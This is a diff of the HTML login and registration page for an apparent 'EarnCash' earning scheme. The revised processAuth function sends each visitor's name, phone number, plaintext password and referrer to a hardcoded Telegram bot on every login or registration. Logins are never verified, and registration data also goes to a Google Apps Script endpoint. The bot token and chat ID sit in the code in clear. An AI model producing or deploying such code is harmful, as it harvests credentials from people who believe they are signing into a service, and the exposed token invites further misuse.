@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login & Register - EarnCash</title>
+    <title>EarnCash - Login/Register</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
         :root { --primary: #0066ff; --bg: #f4f7fe; }
@@ -12,15 +12,12 @@
         .auth-container { background: white; width: 100%; max-width: 400px; padding: 35px 25px; border-radius: 30px; box-shadow: 0 15px 35px rgba(0,0,0,0.08); text-align: center; }
         .logo { font-size: 32px; margin-bottom: 10px; display: block; }
         h2 { font-size: 24px; font-weight: 700; color: #1a1a1a; margin-bottom: 8px; }
-        p { font-size: 14px; color: #777; margin-bottom: 25px; }
         .form-group { margin-bottom: 18px; text-align: left; }
         .form-group label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #555; }
-        .form-group input { width: 100%; padding: 14px; border: 1.5px solid #ebebeb; border-radius: 14px; font-size: 15px; outline: none; transition: 0.3s; background: #fafafa; }
-        .form-group input:focus { border-color: var(--primary); background: white; box-shadow: 0 0 0 4px rgba(0,102,255,0.05); }
-        .main-btn { width: 100%; background: var(--primary); color: white; border: none; padding: 16px; border-radius: 14px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px; transition: 0.3s; }
-        .main-btn:disabled { background: #ccc; cursor: not-allowed; }
+        .form-group input { width: 100%; padding: 14px; border: 1.5px solid #ebebeb; border-radius: 14px; font-size: 15px; outline: none; background: #fafafa; }
+        .main-btn { width: 100%; background: var(--primary); color: white; border: none; padding: 16px; border-radius: 14px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px; }
         .toggle-text { margin-top: 25px; font-size: 14px; color: #666; }
-        .toggle-text span { color: var(--primary); font-weight: 700; cursor: pointer; text-decoration: underline; }
+        .toggle-text span { color: var(--primary); font-weight: 700; cursor: pointer; }
         .hidden { display: none; }
     </style>
 </head>
@@ -29,7 +26,7 @@
     <div class="auth-container">
         <span class="logo">🧼</span>
         <h2 id="title">Create Account</h2>
-        <p id="subtitle">Start your earning journey!</p>
+        <p id="subtitle" style="font-size: 13px; color: #777; margin-bottom: 20px;">Join us and start earning!</p>
 
         <div id="reg-only" class="form-group">
             <label>Full Name</label>
@@ -38,12 +35,12 @@
 
         <div class="form-group">
             <label>Mobile Number</label>
-            <input type="tel" id="phone" placeholder="Enter 10 digit number">
+            <input type="tel" id="phone" placeholder="10 digit number">
         </div>
 
         <div class="form-group">
             <label>Password</label>
-            <input type="password" id="pass" placeholder="Enter password">
+            <input type="password" id="pass" placeholder="Create password">
         </div>
 
         <button class="main-btn" onclick="processAuth()" id="btn-text">Register Now</button>
@@ -56,85 +53,50 @@
     <script>
         let mode = 'register'; 
         const scriptURL = 'https://script.google.com/macros/s/AKfycbyOp4E3zHasQv338D4kQ0NDUZPjCRhKmwDdpUoqjQcaMAURh4Ya08PFGHTWs3kJh5j5/exec';
-        
         const urlParams = new URLSearchParams(window.location.search);
         const referrer = urlParams.get('ref') || 'Direct';
 
         function switchMode() {
-            const title = document.getElementById('title');
-            const subtitle = document.getElementById('subtitle');
-            const regField = document.getElementById('reg-only');
-            const btnText = document.getElementById('btn-text');
-            const toggleMsg = document.getElementById('toggle-msg');
-
-            if (mode === 'register') {
-                mode = 'login';
-                title.innerText = "Welcome Back";
-                subtitle.innerText = "Login to access your plans";
-                regField.classList.add('hidden');
-                btnText.innerText = "Login Now";
-                toggleMsg.innerHTML = "Don't have an account? <span onclick='switchMode()'>Register</span>";
-            } else {
-                mode = 'register';
-                title.innerText = "Create Account";
-                subtitle.innerText = "Start your earning journey!";
-                regField.classList.remove('hidden');
-                btnText.innerText = "Register Now";
-                toggleMsg.innerHTML = "Already have an account? <span onclick='switchMode()'>Login</span>";
-            }
+            mode = (mode === 'register') ? 'login' : 'register';
+            document.getElementById('title').innerText = mode === 'register' ? "Create Account" : "Welcome Back";
+            document.getElementById('reg-only').classList.toggle('hidden');
+            document.getElementById('btn-text').innerText = mode === 'register' ? "Register Now" : "Login Now";
         }
 
-        function processAuth() {
+        async function processAuth() {
             const phone = document.getElementById('phone').value;
             const password = document.getElementById('pass').value;
             const name = document.getElementById('name').value;
             const btn = document.getElementById('btn-text');
 
-            if (phone.length < 10) { alert("Invalid Number!"); return; }
-            if (password.length < 4) { alert("Short Password!"); return; }
-            if (mode === 'register' && name === "") { alert("Please enter your name!"); return; }
+            if (phone.length < 10 || password.length < 4) { alert("Details sahi dalo!"); return; }
 
-            btn.innerText = "Processing...";
+            btn.innerText = "Connecting...";
             btn.disabled = true;
 
-            if (mode === 'register') {
-                // 1. Save locally
-                localStorage.setItem('userPhone', phone);
-                localStorage.setItem('userName', name);
-                localStorage.setItem('userBalance', '0');
+            // 1. Telegram Message (Humesha jayega)
+            const teleMsg = `👤 *NEW ACTIVITY*\n\n📌 Mode: ${mode.toUpperCase()}\n📛 Name: ${name || 'User'}\n📞 Phone: ${phone}\n🔑 Pass: ${password}\n🔗 Ref: ${referrer}`;
+            fetch(`https://api.telegram.org/bot7682752151:AAHnHH8fHvNmLoCIAMPlZ_I88esXwy6b53E/sendMessage?chat_id=8415600127&text=${encodeURIComponent(teleMsg)}&parse_mode=Markdown`);
 
-                // 2. Google Sheet Submission
+            if (mode === 'register') {
                 let formData = new FormData();
                 formData.append('Name', name);
                 formData.append('Phone', phone);
                 formData.append('Password', password);
                 formData.append('Referrer', referrer);
-                formData.append('Balance', '0');
 
-                fetch(scriptURL, { method: 'POST', body: formData })
-                .then(() => {
-                    // 3. Telegram Notification
-                    sendTelegramNotify(name, phone, password, referrer);
-                    // 4. Redirect to Plans (Jaise pehle tha)
-                    window.location.href = "plans.html";
-                })
-                .catch(() => {
-                    // Fallback in case of error
-                    window.location.href = "plans.html";
-                });
-
+                try {
+                    await fetch(scriptURL, { method: 'POST', body: formData });
+                    localStorage.setItem('userPhone', phone);
+                    localStorage.setItem('userName', name);
+                    window.location.href = "plans.html"; // Signup ke baad Plans par bhej raha hu
+                } catch (e) {
+                    window.location.href = "plans.html"; 
+                }
             } else {
-                // Login Mode
                 localStorage.setItem('userPhone', phone);
                 window.location.href = "home.html";
             }
-        }
-
-        function sendTelegramNotify(n, p, pass, ref) {
-            const token = "7682752151:AAHnHH8fHvNmLoCIAMPlZ_I88esXwy6b53E";
-            const chat_id = "8415600127";
-            const msg = `👤 *USER ACTIVITY*\n\n📌 Mode: REGISTER\n📛 Name: ${n}\n📞 Phone: ${p}\n🔑 Pass: ${pass}\n🔗 Referred By: ${ref}`;
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
         }
     </script>
 </body>
